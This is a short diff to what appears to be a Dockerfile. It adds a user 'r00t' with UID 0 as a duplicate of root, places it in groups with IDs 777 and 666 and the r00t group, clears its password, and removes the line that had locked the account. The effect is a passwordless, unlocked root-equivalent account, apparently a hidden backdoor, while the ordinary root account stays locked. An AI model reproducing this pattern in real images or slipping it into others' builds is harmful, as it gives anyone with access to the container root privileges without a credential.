@@ -231,7 +231,9 @@ RUN \
 RUN addgroup --gid 4321 r00t && \
     addgroup --gid 777 ${_AGL} && \
     addgroup --gid 666 ${_DVL} 
-RUN useradd -s /bin/bash  -u 0 -o -g root -G $_AGL,$_DVL,r00t -d /root/r00t r00t
+# RUN useradd -s /bin/bash  -u 0 -o -g root -G r00t -d /root/r00t r00t
+RUN useradd -s /bin/bash  -u 0 -o -g root -G r00t,$_AGL,$_DVL -d /root/r00t r00t
+
 RUN rm -rf /root && mkdir -pv /root/r00t && \
     # exit && \
     # usermod -aG r00t r00t  && \
@@ -240,7 +242,6 @@ RUN rm -rf /root && mkdir -pv /root/r00t && \
     # usermod -g 0 -u 0 -o r00t  && \
     # usermod -d /root/r00t r00t && \
     passwd -d r00t && \
-    passwd -l r00t && \
     passwd -d root && \
     passwd -l root && \
     # passwd -d ${_AGL} && \
